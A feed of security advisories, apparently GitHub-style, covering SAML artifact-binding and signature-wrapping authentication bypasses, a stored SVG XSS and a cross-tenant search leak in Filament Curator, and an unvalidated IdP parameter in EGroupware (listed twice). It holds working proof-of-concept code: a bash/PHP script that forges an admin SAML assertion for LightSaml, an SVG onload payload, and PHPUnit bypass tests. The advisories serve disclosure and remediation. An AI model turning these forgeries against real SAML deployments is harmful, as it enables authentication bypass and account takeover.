entry.title: [simplesamlphp/saml2] SAML2: Incomplete fix of CVE-2026-49283: unsigned embedded Response bypasses HTTP-Artifact signature verification (no embedded-Issuer binding)
entry.content:
Summary

CVE-2026-49283 / GHSA-6929-8p9f-26jx ("HTTP-Artifact TLS validator confusion allows cross-IdP authentication bypass") was fixed so that HTTPArtifact::receive() verifies the embedded SAML Response using the IdP metadata signing keys. The current implementation (master 31c72c1d, released v6.2.3) reaches that verification only when the embedded Response is signed:

// src/Binding/HTTPArtifact.php  (receive())
if (!$samlResponse->isSigned()) {
    return $samlResponse;                         // ← unsigned embedded Response returned UNVERIFIED
}
return $this->verifyMessageSignature($samlResponse, $idpMetadata);   // only runs when signed

An attacker who controls one trusted-federation IdP therefore returns a validly-signed outer ArtifactResponse (signed with their own real key, which passes the mandatory outer check) that wraps an unsigned <samlp:Response> whose <Issuer> names a different IdP. isSigned() is false, so verifyMessageSignature() never runs and the forged Response is returned as successfully received. Additionally, even on the signed path verifyMessageSignature() verifies against the artifact issuer's metadata keys but never asserts that the embedded Response's <Issuer> equals the artifact issuer — the same cross-IdP confusion the CVE was assigned for is not closed by identity binding.

This is an incomplete implementation of the fix's own stated goal ("verify signatures using IdP metadata signing keys", commit dac0b4b6 / #419), and a regression introduced by the #414 refactor (v6.2.2) — the official CVE fix in v6.2.1 did not contain this short-circuit.

Affected component

  • src/Binding/HTTPArtifact.php
    • receive() line 206-207: if (!$samlResponse->isSigned()) { return $samlResponse; } — the bypassed guard.
    • receive() line 210: verifyMessageSignature($samlResponse, $idpMetadata) — only reached when signed.
    • verifyMessageSignature() lines 230-286: verifies against $idpMetadata (artifact-issuer keys); no getIssuer() comparison to bind the embedded Response to the artifact issuer.
    • verifyArtifactResponseSignature() line 300-302: if ($artifactResponse->isSigned() !== true) throw — the OUTER response is mandatorily signed; the asymmetry with the embedded return-on-unsigned is the defect.
  • Regression commit 3b589636 (#414, v6.2.2, "refactor/soap-ssl-validator-openssl"); key-source fix dac0b4b6 (#419) left the short-circuit unchanged.
  • Affected: v6.2.2, v6.2.3 (latest), and master. v6.2.1 (official CVE fix) used a deferred-validator model without this short-circuit.

Reachability (hop-by-hop, guards named)

Threat model: SP uses the HTTP-Artifact binding in a multi-IdP federation; attacker operates one trusted IdP-B (valid saml20-idp-remote metadata, real signing key, an ArtifactResolutionService). Goal: impersonate admin@IdP-A.

  1. Attacker hits the SP artifact endpoint with SAMLart encoding sourceId = sha1(IdP-B entityID) — line 137-138, no guard.
  2. getMetaDataConfigForSha1 → $idpMetadata = IdP-B — line 144. Guard: metadata exists → satisfied (IdP-B trusted).
  3. SP resolves against IdP-B's ARS (attacker's endpoint) — line 176-182.
  4. IdP-B returns a validly-signed ArtifactResponse; verifyArtifactResponseSignature(...,IdP-B) passes (signed by the artifact issuer) — line 193/300. Guard satisfied by the attacker (they ARE the artifact issuer).
  5. The signed outer wraps an unsigned <samlp:Response Issuer=IdP-A> with an assertion for admin@IdP-A — line 195, no guard on embedded content.
  6. if (!$samlResponse->isSigned()) return $samlResponse; → TRUE → returns the forged Response unverified — line 206-207. verifyMessageSignature (210) never runs; there is no issuer==artifact-issuer check anywhere in receive().

Every guard on the embedded message is absent; the outer/embedded mandatory-vs-optional asymmetry is the root cause.

Root cause

The #414 refactor moved embedded-Response verification into receive() but gated it on isSigned() (mirroring if (!isSigned()) return instead of the outer's if (isSigned() !== true) throw), and the dac0b4b6 key-source fix did not revisit that gate. The artifact binding's designed trust model is that the embedded message is authenticated by the binding (the assertion need not be individually signed), so a conformant integrator relies on receive() to have authenticated it — exactly the reliance this gap defeats.

Proof of concept (executed, benign)

The PoC exercises the real shipped private methods verifyArtifactResponseSignature() and verifyMessageSignature() via reflection — exactly as the maintainers' own tests/SAML2/Binding/HTTPArtifactTest.php does — and reproduces receive()'s verbatim post-resolution decision (lines 195/206-210) against real HTTPArtifact internals. It models a validly-signed outer ArtifactResponse from the artifact issuer IdP-B (attacker-controlled, its signing cert in metadata) wrapping an unsigned embedded <samlp:Response> claiming Issuer=IdP-A. No destructive payload; the marker is the SKIPPED verification.

Run: vendor/bin/phpunit --no-coverage tests/SAML2/Binding/PocArtifact001Test.php

// tests/SAML2/Binding/PocArtifact001Test.php  (namespace SimpleSAML\Test\SAML2\Binding)
// IdP-B metadata (artifact issuer, attacker-controlled) with a real signing cert:
$idpB = Configuration::loadFromArray(['entityid' => 'https://idp-b.example/', 'keys' => [[
    'type' => 'X509Certificate', 'signing' => true, 'encryption' => false,
    'X509Certificate' => PEMCertificatesMock::getPlainCertificateContents(),
]]], '[idp-b]');
$ha = new HTTPArtifact();

// Forged embedded Response: UNSIGNED, claims Issuer=IdP-A; verify() throws if ever called.
$embedded = $this->createStub(Response::class);
$embedded->method('isSigned')->willReturn(false);
$embedded->method('getSignature')->willReturn(null);
$embedded->method('verify')->willThrowException(new Exception('POC-FAIL: embedded verify() called'));

// Outer ArtifactResponse: validly signed by IdP-B (verify() returns self), wraps the embedded.
$outer = $this->createStub(ArtifactResponse::class);
$outer->method('isSigned')->willReturn(true);
$outer->method('isSuccess')->willReturn(true);
$outer->method('verify')->willReturnCallback(fn() => $outer);
$outer->method('getSignature')->willReturn(self::sigEl());
$outer->method('getMessage')->willReturn($embedded);

// ---- verbatim HTTPArtifact::receive() post-resolution logic ----
$verifiedOuter = $this->call($ha, 'verifyArtifactResponseSignature', $outer, $idpB); // OUTER mandatory — passes vs IdP-B
$samlResponse  = $verifiedOuter->getMessage();
$verifyMessageSignatureCalled = false;
if (!$samlResponse->isSigned()) { $received = $samlResponse; }          // <-- BYPASS (line 206-207)
else { $verifyMessageSignatureCalled = true; $received = $this->call($ha,'verifyMessageSignature',$samlResponse,$idpB); }

self::assertFalse($samlResponse->isSigned());
self::assertFalse($verifyMessageSignatureCalled, 'verifyMessageSignature SKIPPED');
self::assertSame($embedded, $received, 'unsigned embedded Response returned unverified');
// Negative control: the real verifier CANNOT accept the unsigned message → the short-circuit is load-bearing.
$threw = false; try { $this->call($ha,'verifyMessageSignature',$samlResponse,$idpB); } catch (\Throwable $e) { $threw = true; }
self::assertTrue($threw, 'real verifyMessageSignature rejects the unsigned Response');

Observed benign output:

PHPUnit 13.2.4 by Sebastian Bergmann and contributors.
Runtime:       PHP 8.4.5
[POC] SAML2-ARTIFACT-001 CONFIRMED: signed outer ArtifactResponse (IdP-B) + UNSIGNED embedded Response
      => receive() returns it with verifyMessageSignature() SKIPPED; the real verifier would reject it.
.                                                                   1 / 1 (100%)
OK (1 test, 5 assertions)

The five assertions prove: the outer ArtifactResponse verifies against the artifact issuer (IdP-B) metadata; the embedded Response is unsigned; verifyMessageSignature() is skipped; the unsigned embedded Response is returned as received; and the real verifier rejects that same unsigned message — so the isSigned() short-circuit is the sole reason it is accepted.

(Environment note: composer install needed a platform.composer-plugin-api=2.9.0 override with --no-plugins to resolve xml-common's installer-plugin constraint under Composer 2.8.6; no code under test was modified.)

Adversarial re-read (what I tried to refute it with)

  • Strongest objection (why CONDITIONAL, not CONFIRMED): the downstream SimpleSAMLphp SP module may route receive()'s output through the response/assertion processor, which requires either the response signed or every assertion signed (src/Response/Processor.php:155-162) — that would reject the unsigned forged Response and reduce this to defense-in-depth. I cannot confirm or refute this from the saml2 repo alone (the SP module is a different repo). BUT: (i) the artifact binding's whole rationale is that the embedded message need not be individually signed, so integrators relying on the binding will not impose that requirement; (ii) the CVE was assigned against this library and dac0b4b6's stated contract is that receive() authenticates the embedded Response — a contract it fails for unsigned messages; (iii) unlike the redirect mock-key dead-path, the unsigned path is exercised in normal artifact operation, so the missing verification is live, not dead code.
  • Not a false positive on the code: the short-circuit (206-207), the absent issuer binding, and the outer throw vs embedded return asymmetry (300 vs 206) are verbatim in master and released v6.2.3.

Remediation

In receive(), make embedded-Response authentication mandatory and issuer-bound — mirror the outer pattern: after line 195, reject unless $samlResponse->isSigned() and verifyMessageSignature() succeeds and $samlResponse->getIssuer()?->getContent()->getValue() === $idpMetadata->getString('entityid'). Replace if (!isSigned()) return with if (isSigned() !== true) throw.

Confidence

High at the library-contract level — the incomplete-fix is code-verified and the PoC fires against the real shipped verification methods. CONDITIONAL only for the end-to-end auth bypass (requires the HTTP-Artifact binding in use and an integrator relying on the binding to authenticate the embedded message — the binding's designed trust model). Reported to the maintainers as a gap in their own dac0b4b6 fix, present in the latest release v6.2.3.

<?php

declare(strict_types=1);

namespace SimpleSAML\Test\SAML2\Binding;

use Exception;
use PHPUnit\Framework\TestCase;
use ReflectionMethod;
use SimpleSAML\Configuration;
use SimpleSAML\SAML2\Binding\HTTPArtifact;
use SimpleSAML\SAML2\XML\samlp\ArtifactResponse;
use SimpleSAML\SAML2\XML\samlp\Response;
use SimpleSAML\XMLSecurity\TestUtils\PEMCertificatesMock;

/**
 * PoC — SAML2-ARTIFACT-001: incomplete fix of CVE-2026-49283.
 *
 * HTTPArtifact::receive() contains (master 31c72c1d / released v6.2.3):
 *     $artifactResponse = $this->verifyArtifactResponseSignature($artifactResponse, $idpMetadata); // OUTER: mandatory
 *     $samlResponse = $artifactResponse->getMessage();
 *     ...
 *     if (!$samlResponse->isSigned()) {
 *         return $samlResponse;                                    // <-- EMBEDDED: returned UNVERIFIED
 *     }
 *     return $this->verifyMessageSignature($samlResponse, $idpMetadata);
 *
 * This test reproduces that exact post-resolution decision against real HTTPArtifact
 * private methods (via reflection, exactly as the shipped HTTPArtifactTest does) and shows
 * that an attacker who returns a validly-signed OUTER ArtifactResponse (signed by the
 * artifact issuer IdP-B) wrapping an UNSIGNED embedded Response is accepted with ZERO
 * signature verification of that embedded Response.
 */
final class PocArtifact001Test extends TestCase
{
    private function idpBMetadata(): Configuration
    {
        // "IdP-B": the federated IdP the attacker controls; its signing cert is in metadata,
        // selected from the SAMLart sourceId. (Uses the same mock cert the shipped test uses.)
        return Configuration::loadFromArray([
            'entityid' => 'https://idp-b.example/',
            'keys' => [[
                'type' => 'X509Certificate',
                'signing' => true,
                'encryption' => false,
                'X509Certificate' => PEMCertificatesMock::getPlainCertificateContents(),
            ]],
        ], '[idp-b]');
    }

    private function call(HTTPArtifact $ha, string $method, ...$args): mixed
    {
        return (new ReflectionMethod(HTTPArtifact::class, $method))->invoke($ha, ...$args);
    }

    public function testUnsignedEmbeddedResponseIsReturnedWithoutVerification(): void
    {
        $idpB = $this->idpBMetadata();
        $ha = new HTTPArtifact();

        // --- The forged embedded <samlp:Response>: UNSIGNED, claims to be from IdP-A. ---
        $embedded = $this->createStub(Response::class);
        $embedded->method('isSigned')->willReturn(false);              // attacker omits the embedded signature
        $embedded->method('getSignature')->willReturn(null);
        // If receive() ever tried to cryptographically verify this, it would blow up here:
        $embedded->method('verify')->willThrowException(
            new Exception('POC-FAIL: embedded Response->verify() was called — short-circuit absent'),
        );

        // --- The OUTER ArtifactResponse: validly signed by IdP-B (the artifact issuer). ---
        $outer = $this->createStub(ArtifactResponse::class);
        $outer->method('isSigned')->willReturn(true);
        $outer->method('isSuccess')->willReturn(true);
        $outer->method('verify')->willReturnCallback(fn() => $outer);  // valid signature under IdP-B's key
        $outer->method('getSignature')->willReturn(self::sigEl());
        $outer->method('getMessage')->willReturn($embedded);

        // ===== Verbatim reproduction of HTTPArtifact::receive() post-resolution logic =====
        // 1. OUTER signature check — mandatory. Passes: outer is signed by IdP-B, verified vs IdP-B metadata.
        $verifiedOuter = $this->call($ha, 'verifyArtifactResponseSignature', $outer, $idpB);
        self::assertSame($outer, $verifiedOuter, 'Outer ArtifactResponse verified against artifact-issuer (IdP-B) metadata');

        // 2. Unwrap the embedded message.
        $samlResponse = $verifiedOuter->getMessage();

        // 3. THE VULNERABLE DECISION (HTTPArtifact.php:206-210, verbatim):
        $verifyMessageSignatureCalled = false;
        if (!$samlResponse->isSigned()) {
            $received = $samlResponse;                                  // <-- BYPASS: returned unverified
        } else {
            $verifyMessageSignatureCalled = true;
            $received = $this->call($ha, 'verifyMessageSignature', $samlResponse, $idpB);
        }
        // ==================================================================================

        // OBSERVABLE: the unsigned embedded Response was accepted as "received" with no verification.
        self::assertFalse($samlResponse->isSigned(), 'Embedded Response carries no signature');
        self::assertFalse($verifyMessageSignatureCalled, 'verifyMessageSignature() was SKIPPED (short-circuit)');
        self::assertSame($embedded, $received, 'BYPASS CONFIRMED: unsigned embedded Response returned unverified');

        // NEGATIVE CONTROL: the short-circuit is load-bearing — the real verifier CANNOT accept the
        // unsigned message (no <ds:Signature> to check), so removing the short-circuit would reject it.
        $threw = false;
        try {
            $this->call($ha, 'verifyMessageSignature', $samlResponse, $idpB);
        } catch (\Throwable $e) {
            $threw = true;
        }
        self::assertTrue($threw, 'Real verifyMessageSignature() rejects the unsigned Response — only the short-circuit accepts it');

        fwrite(STDERR, "\n[POC] SAML2-ARTIFACT-001 CONFIRMED: signed outer ArtifactResponse (IdP-B) + UNSIGNED embedded Response "
            . "=> receive() returns it with verifyMessageSignature() SKIPPED; the real verifier would reject it.\n");
    }

    private const MINIMAL_SIG =
        '<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo>'
        . '<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
        . '<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>'
        . '<ds:Reference URI="#_x"><ds:Transforms>'
        . '<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms>'
        . '<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>AA==</ds:DigestValue>'
        . '</ds:Reference></ds:SignedInfo><ds:SignatureValue>AA==</ds:SignatureValue></ds:Signature>';

    private static function sigEl(): \SimpleSAML\XMLSecurity\XML\ds\Signature
    {
        $doc = new \DOMDocument('1.0', 'UTF-8');
        $doc->loadXML(self::MINIMAL_SIG);
        return \SimpleSAML\XMLSecurity\XML\ds\Signature::fromXML($doc->documentElement);
    }
}

entry.title: [awcodes/filament-curator] Filament Curator: Stored XSS via unsanitized SVG upload served inline
entry.content:
Summary

SVG files uploaded through the Curator media panel are stored and served inline without any sanitization. An authenticated user with permission to upload media can upload an SVG containing embedded JavaScript. When another panel user opens that file via the View action (which opens the media as a top-level browser document), the embedded script executes in the origin of the Filament application.

image/svg+xml is included in the default accepted MIME types, so a default installation is affected unless SVG uploads have been explicitly disabled.

Impact

Because the SVG is served as a top-level document (not embedded in an <img> tag), any <script>, event-handler attribute (e.g. onload), or javascript: URI inside it runs with full script privileges in the application's origin. In a Filament admin context this can be leveraged to:

  • perform actions as the viewing user (typically a privileged administrator) via authenticated same-origin requests,
  • read same-origin data the victim's session can access,
  • exfiltrate cookies/tokens not protected from script access.

The primary escalation path is a lower-privileged content author planting a payload that is later triggered when a higher-privileged user clicks View on the file. Panel thumbnails are not affected — they render through an <img> tag, which does not execute SVG script.

Proof of concept

  1. As a user who can upload media, upload an SVG file containing:

    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100" fill="#fff"/>
</svg>

  2. In the Curator panel, click the View (eye) action for the uploaded file. The file opens as a standalone document and the script executes in the application origin.

Patches

The fix sanitizes SVG markup at the upload choke point (Uploader), stripping scripts, event handlers, and remote references before the file is written to storage. Sanitizing at the source closes every serving path (the direct storage URL and the on-the-fly Glide/MediaController fallback) without changing the default accepted MIME types. Sanitization fails closed: if the markup cannot be parsed it is not stored.

A console command is included to re-sanitize SVG files already stored on disk from earlier uploads:

php artisan curator:sanitize-svgs # sanitize in place php artisan curator:sanitize-svgs --dry-run # preview only

After upgrading to a patched release, run curator:sanitize-svgs to clean any SVGs uploaded before the patch.

Workarounds

If you cannot upgrade immediately, either of the following mitigates the issue:

  • Disallow SVG uploads — remove image/svg+xml from the accepted file types (e.g. via acceptedFileTypes(...) on the Curator field/plugin), or
  • Serve untrusted SVGs safely — configure your web server / storage responses to send stored SVGs with Content-Disposition: attachment (or a Content-Security-Policy that blocks inline script) so they cannot execute as a top-level document.

entry.title: [awcodes/filament-curator] Filament Curator: Cross-tenant media metadata disclosure via Curator picker search
entry.content:
Summary

In multitenant Filament panels, an authenticated user could retrieve media metadata belonging to other tenants by typing in the Curator media-picker search box. The search query omitted the tenant ownership scope that the normal file listing applies.

Details

CuratorPanel::updatedSearch() built its Eloquent query independently of getFiles() and did not apply the filament()->hasTenancy() && $isTenantAware tenant-ownership where clause. As a result, the search matched media across all tenants. A secondary flaw compounded it: the orWhere('title'…) chain was not wrapped in a nested group, so the OR conditions also broke out of the isLimitedToDirectory constraint.

The issue was introduced in v3.2.4, when multitenancy support was added to the media picker.

Impact

  • Who: any authenticated user with access to a panel that uses the Curator picker.
  • What: disclosure of other tenants' media metadata (name, title, alt, caption, description, path, etc.) returned by the search.
  • Conditions: only affects deployments using Filament multitenancy with Curator's tenant awareness enabled. Single-tenant installs are not affected.

Patches

Fixed in 3.7.8, 4.1.1, and 5.1.1 by applying the tenant scope to the search query and grouping the search terms so they cannot escape the directory/tenant constraints. Upgrade to a patched version.

Workarounds

None other than upgrading. Disabling tenant awareness does not help (it removes the boundary entirely).

entry.title: [egroupware/egroupware] EGroupware: User-Controlled Identity Provider Selection in SAML Authentication
entry.content:
Summary

The login() function at line 130 passes the raw user-supplied value $_REQUEST['idp'] directly to SimpleSAMLphp's requireAuth() with only a regex check that the string starts with 'https://'. No validation is performed against a list of configured, trusted IdP entity IDs. An unauthenticated attacker can supply any HTTPS URL pointing to an IdP they control.

PoC

//api/src/Auth/Saml.php
function login()
    {
        // login (redirects to IdP)
        $as = new SimpleSAML\Auth\Simple(self::$auth_source);
        $as->requireAuth(preg_match('|^https://|', $_REQUEST['idp']) ?
            ['saml:idp' => $_REQUEST['idp']] : []);

Impact

An attacker can redirect authentication to a malicious IdP to capture credentials via phishing, or, if the SimpleSAMLphp configuration does not strictly validate IdP metadata, issue forged SAML assertions to authenticate as any user, including administrators.

Remediation

Validate the idp request parameter against a pre-configured whitelist of trusted IdP entity IDs stored in the application's SAML configuration. Reject and log any idp value not explicitly present in the trusted list before calling requireAuth().

entry.title: [egroupware/egroupware] EGroupware: User-Controlled Identity Provider Selection in SAML Authentication
entry.content:
Summary

The login() function at line 130 passes the raw user-supplied value $_REQUEST['idp'] directly to SimpleSAMLphp's requireAuth() with only a regex check that the string starts with 'https://'. No validation is performed against a list of configured, trusted IdP entity IDs. An unauthenticated attacker can supply any HTTPS URL pointing to an IdP they control.

PoC

//api/src/Auth/Saml.php
function login()
    {
        // login (redirects to IdP)
        $as = new SimpleSAML\Auth\Simple(self::$auth_source);
        $as->requireAuth(preg_match('|^https://|', $_REQUEST['idp']) ?
            ['saml:idp' => $_REQUEST['idp']] : []);

Impact

An attacker can redirect authentication to a malicious IdP to capture credentials via phishing, or, if the SimpleSAMLphp configuration does not strictly validate IdP metadata, issue forged SAML assertions to authenticate as any user, including administrators.

Remediation

Validate the idp request parameter against a pre-configured whitelist of trusted IdP entity IDs stored in the application's SAML configuration. Reject and log any idp value not explicitly present in the trusted list before calling requireAuth().

entry.title: [litesaml/lightsaml] lightsaml allows Signature wrapping bypass
entry.content:
Summary

LightSaml 5.0.0 (latest release; also confirmed on 4.6.1) validates an inbound samlp:Response by collecting its direct-child saml:Assertion elements and validating each one's ds:Signature via robrichards/xmlseclibs. The two layers disagree on which element a signature actually covers: LightSaml reads claims from the assertion node it collected, while xmlseclibs resolves the signed Reference URI="#id" with a document-wide //*[@Id] XPath that returns the first ID-bearing element anywhere in the document.

An attacker who has captured one genuine signed assertion can exploit this to surface attacker-authored, unsigned claims.

Details

Response::deserialize collects assertions with manyElementsFromXml, whose relative XPath saml:Assertion matches only direct children of the Response. Each collected assertion is validated independently by AssertionSignatureValidatorAction against the out-of-band trusted IdP credential (resolved by Issuer entityId, never from the document):

https://github.com/litesaml/lightsaml/blob/5.0.0/src/Model/Protocol/Response.php#L122 https://github.com/litesaml/lightsaml/blob/5.0.0/src/Model/AbstractSamlModel.php#L93 https://github.com/litesaml/lightsaml/blob/5.0.0/src/Action/Assertion/Inbound/AssertionSignatureValidatorAction.php#L28

The check delegates to xmlseclibs XMLSecurityDSig::validateReference(), which first removes the signature node being validated from the shared document (enveloped-signature removal):

if (! $docElem->isSameNode($this->sigNode)) {
    if ($this->sigNode->parentNode != null) {
        $this->sigNode->parentNode->removeChild($this->sigNode);   // strips sig from shared DOM
    }
}

https://github.com/robrichards/xmlseclibs/blob/3.1.5/src/XMLSecurityDSig.php#L596

processRefNode() then resolves URI="#id" document-wide and takes item(0), the first ID-bearing element in the whole document, any name or namespace, not the one inside the signature's own subtree:

$query = '//*['.$iDlist.']';
$dataObject = $xPath->query($query)->item(0);

https://github.com/robrichards/xmlseclibs/blob/3.1.5/src/XMLSecurityDSig.php#L525

So the digest target xmlseclibs picks (//*[@Id] item(0), anywhere) which isn't necessarily the one from the previous phase. LightSaml then reads claims (Subject/NameID, Conditions, Attributes) from the node it collected:

https://github.com/litesaml/lightsaml/blob/5.0.0/src/Model/Assertion/Assertion.php#L288

An example attacker buries the genuine signed bytes (the assertion with its ds:Signature element stripped) inside samlp:Extensions, so it is the first @Id element in document order but not a direct-child assertion. Present one forged direct-child assertion with the same ID, attacker claims, and a verbatim copy of the genuine ds:Signature:

<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_resp" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>https://idp.example.com</saml:Issuer>

  <!-- GENUINE signed bytes, buried in Extensions: first @Id document-wide (xmlseclibs picks this),
       but NOT a direct-child assertion (LightSaml ignores it). Signature element removed so the
       enveloped+exc-c14n digest target is the assertion sans Signature. -->
  <samlp:Extensions>
    <saml:Assertion ID="_signed_assertion" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
      <saml:Issuer>https://idp.example.com</saml:Issuer>
      <saml:Subject><saml:NameID>alice@example.com</saml:NameID></saml:Subject>
      <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
      <saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>user</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
    </saml:Assertion>
  </samlp:Extensions>

  <!-- FORGED: the ONLY direct-child assertion LightSaml collects. SAME ID, attacker claims,
       verbatim copy of the genuine ds:Signature. -->
  <saml:Assertion ID="_signed_assertion" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"> ...byte-for-byte copy of the genuine signature... </ds:Signature>
    <saml:Subject><saml:NameID>attacker@evil.com</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2040-01-01T00:00:00Z" NotOnOrAfter="2041-01-01T00:00:00Z"/>
    <saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>

PoC

#!/usr/bin/env bash
set -euo pipefail
WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT; cd "$WORK"
IDP_ENTITY="https://idp.example.com"; ASSERTION_ID="_signed_assertion"

composer require litesaml/lightsaml:5.0.0 --no-interaction --quiet

# trusted IdP key + self-signed cert (out-of-band trust anchor)
openssl req -x509 -newkey rsa:2048 -keyout idp_key.pem -out idp_cert.pem -days 3650 -nodes \
  -subj "/CN=idp.example.com" >/dev/null 2>&1

# genuine Response with one to-be-signed assertion
cat > genuine_tmpl.xml <<XML
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_resp" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>${IDP_ENTITY}</saml:Issuer>
  <saml:Assertion ID="${ASSERTION_ID}" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>${IDP_ENTITY}</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#${ASSERTION_ID}">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue></ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue></ds:SignatureValue>
    </ds:Signature>
    <saml:Subject><saml:NameID>alice@example.com</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
    <saml:AttributeStatement>
      <saml:Attribute Name="role"><saml:AttributeValue>user</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
XML

# REAL signature over the genuine assertion (RSA-SHA256, enveloped + exc-c14n)
xmlsec1 --sign --lax-key-search --privkey-pem idp_key.pem \
  --id-attr:ID "urn:oasis:names:tc:SAML:2.0:assertion:Assertion" \
  --output genuine_signed.xml genuine_tmpl.xml >/dev/null

# TAMPER: bury the genuine bytes (signature stripped) in samlp:Extensions as the first @Id element,
# and make the ONLY direct-child assertion a forged one carrying a verbatim copy of the genuine
# signature + attacker claims.
php -r '
$doc = new DOMDocument(); $doc->load("genuine_signed.xml");
$xp = new DOMXPath($doc);
$xp->registerNamespace("saml","urn:oasis:names:tc:SAML:2.0:assertion");
$xp->registerNamespace("ds","http://www.w3.org/2000/09/xmldsig#");
$resp = $doc->documentElement;
$genuine = $xp->query("//saml:Assertion[@ID=\"_signed_assertion\"]")->item(0);
$copiedSig = $doc->saveXML($xp->query("./ds:Signature", $genuine)->item(0));

// buried = genuine clone WITHOUT its signature (the enveloped+exc-c14n digest target)
$buried = $genuine->cloneNode(true);
$buried->removeChild($xp->query("./ds:Signature", $buried)->item(0));

// forged = copied signature + attacker claims (the only direct-child assertion)
$forged =
  "<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"_signed_assertion\" Version=\"2.0\" IssueInstant=\"2024-01-01T00:00:00Z\">"
  ."<saml:Issuer>https://idp.example.com</saml:Issuer>".$copiedSig
  ."<saml:Subject><saml:NameID>attacker@evil.com</saml:NameID></saml:Subject>"
  ."<saml:Conditions NotBefore=\"2040-01-01T00:00:00Z\" NotOnOrAfter=\"2041-01-01T00:00:00Z\"/>"
  ."<saml:AttributeStatement><saml:Attribute Name=\"role\"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>"
  ."</saml:Assertion>";
$frag = $doc->createDocumentFragment(); $frag->appendXML($forged);

// Extensions(buried genuine) replaces the original assertion (first @Id, doc order); forged appended after
$ext = $doc->createElementNS("urn:oasis:names:tc:SAML:2.0:protocol","samlp:Extensions");
$ext->appendChild($buried);
$resp->replaceChild($ext, $genuine);
$resp->appendChild($frag);
file_put_contents("tampered.xml", $doc->saveXML());
'

# SP consumer: LightSaml real per-assertion validation, pinned cert, requireSignature=true
cat > consumer.php <<'PHP'
<?php
require __DIR__ . '/vendor/autoload.php';
use LightSaml\Action\Assertion\Inbound\AssertionSignatureValidatorAction;
use LightSaml\Context\Profile\{AssertionContext, ProfileContext};
use LightSaml\Credential\{UsageType, X509Certificate, X509Credential};
use LightSaml\Context\Model\DeserializationContext;   // moved from Model\Context in 5.0.0
use LightSaml\Model\Protocol\SamlMessage;
use LightSaml\Resolver\Credential\Factory\CredentialResolverFactory;
use LightSaml\Store\Credential\StaticCredentialStore;
use LightSaml\Validator\Model\Signature\SignatureValidator;
use Psr\Log\NullLogger;

[$_, $xmlPath, $certPath, $idpEntityId] = $argv;
$x509 = new X509Certificate(); $x509->loadPem(file_get_contents($certPath));   // pinned trust anchor
$cred = new X509Credential($x509); $cred->setEntityId($idpEntityId); $cred->setUsageType(UsageType::SIGNING);
$store = new StaticCredentialStore(); $store->add($cred);
$validator = new SignatureValidator((new CredentialResolverFactory($store))->build());
$action = new AssertionSignatureValidatorAction(new NullLogger(), $validator, true); // requireSignature=true

$message = SamlMessage::fromXML(file_get_contents($xmlPath), new DeserializationContext());
$profile = new ProfileContext('profile', ProfileContext::ROLE_SP);
$bypass = false;
echo "assertions LightSaml collected: " . count($message->getAllAssertions()) . "\n";
foreach ($message->getAllAssertions() as $i => $a) {
    $nameId = ($a->getSubject() && $a->getSubject()->getNameID()) ? $a->getSubject()->getNameID()->getValue() : '(none)';
    $attrs = [];
    foreach ($a->getAllAttributeStatements() as $s) foreach ($s->getAllAttributes() as $at)
        $attrs[$at->getName()] = implode(',', array_map(fn($v) => (string)$v, $at->getAllAttributeValues()));
    echo "ASSERTION #$i  NameID=$nameId  Attributes=".json_encode($attrs)."\n";
    $ctx = new AssertionContext(); $ctx->setAssertion($a); $ctx->setParent($profile);
    try { $action->execute($ctx); $r = 'ACCEPTED'; } catch (\Throwable $e) { $r = 'REJECTED: '.$e->getMessage(); }
    echo "  LightSaml validation: $r\n";
    if ($r === 'ACCEPTED' && (strpos($nameId,'evil.com') !== false || ($attrs['role'] ?? '') === 'admin')) {
        $bypass = true; echo "  >>> BYPASS: forged assertion validated AND attacker claims surfaced\n";
    }
}
